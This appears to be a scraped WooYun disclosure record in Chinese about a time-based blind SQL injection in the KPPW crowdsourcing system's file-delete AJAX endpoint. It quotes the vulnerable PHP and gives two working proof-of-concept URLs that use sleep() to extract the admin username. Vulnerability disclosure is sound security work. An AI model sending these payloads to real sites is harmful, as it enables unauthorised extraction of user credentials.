{"id": 56229, "wybug_id": "wooyun-2014-058442", "wybug_title": "kppw威客系统SQL盲注漏洞", "wybug_corp": "keke.com", "wybug_author": "〈／橡皮擦〉", "wybug_date": "2014-04-25 16:44", "wybug_open_date": "2014-07-23 18:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： kppw威客系统SQL盲注漏洞 详细说明：  文件：/control/ajax/ajax_file.php\ncase \"delete\":                        $res = keke_file_class::del_att_file($file_id, $filepath);                        $res and kekezu::echojson ( '', '1' ) or kekezu::echojson ( '', '0' );                        die ();                        break;\n进入del_att_file函数：static function del_att_file($fid = 0, $filepath = '', $del_more = '') {                $file_obj = new Keke_witkey_file_class ();                if ($fid > 0) {                        $where = 'file_id=' . $fid;                        $filepath != '' && $where .= ' and save_name=\"' . $filepath . '\"';                        $file_obj->setWhere ( $where );                        $file_info = $file_obj->query_keke_witkey_file ();                        $file_obj->setWhere ( $where );                        $res = $file_obj->del_keke_witkey_file ();                        $filepath = $file_info [0] ['save_name'];                        if (is_file ( $filepath )) {                                $unlink = unlink ( $filepath );                                if ($del_more != '') {                                        $more_name = array ();                                        $dirname = dirname ( $filepath );                                        $dirname = $dirname . '/';                                        $basename = basename ( $filepath );                                        $size_arr = explode ( ',', $del_more );                                        for($i = 0; $i < sizeof ( $size_arr ); $i ++) {                                                unlink ( $dirname . $size_arr [$i] . '_' . $basename );                                        }                                }                        }                        return $unlink ? $unlink : $res;                }进入query_keke_witkey_file函数：\nfunction query_keke_witkey_file($is_cache=0, $cache_time=0){\t\tif($this->_where){\t\t\t$sql = \"select * from $this->_tablename where \".$this->_where;\t\t}\t\telse{\t\t\t$sql = \"select * from $this->_tablename\";\t\t}\t\tif ($is_cache) {\t\t\t$this->_cache_config ['is_cache'] = $is_cache;\t\t}\t\tif ($cache_time) {\t\t\t$this->_cache_config ['time'] = $cache_time;\t\t}\t\tif ($this->_cache_config ['is_cache']) {\t\t\tif (CACHE_TYPE) {\t\t\t\t$keke_cache = new keke_cache_class ( CACHE_TYPE );\t\t\t\t$id = $this->_tablename . ($this->_where?\"_\" .substr(md5 ( $this->_where ),0,6):'');\t\t\t\t$data = $keke_cache->get ( $id );\t\t\t\tif ($data) {\t\t\t\t\treturn $data;\t\t\t\t} else {\t\t\t\t\t$res = $this->_dbop->query ( $sql );\t\t\t\t\t$keke_cache->set ( $id, $res,$this->_cache_config['time'] );\t\t\t\t\t$this->_where = \"\";\t\t\t\t\treturn $res;\t\t\t\t}\t\t\t}\t\t}else{\t\t\t$this->_where = \"\";\t\t\treturn  $this->_dbop->query ( $sql );\t\t}\t}\n在拼接SQL语句时：$where = 'file_id=' . $fid;$sql = \"select * from $this->_tablename where \".$this->_where;file_id没有过滤，导致sql注入。   漏洞证明：  利用证明：\nhttp://127.0.0.1/kppw/index.php?do=ajax&view=file&ajax=delete&file_id=1 and if(substr((select username from keke_witkey_member where uid=1),1,1)=0x61,sleep(5), 1)%23&filepath=123\n返回正常。\nhttp://127.0.0.1/kppw/index.php?do=ajax&view=file&ajax=delete&file_id=1 and if(substr((select username from keke_witkey_member where uid=1),1,1)=0x62,sleep(5), 1)%23&filepath=123\n返回错误，延迟5秒后返回   修复方案：  过滤   版权声明：转载请注明来源 〈／橡皮擦〉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-07-23 18:34 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}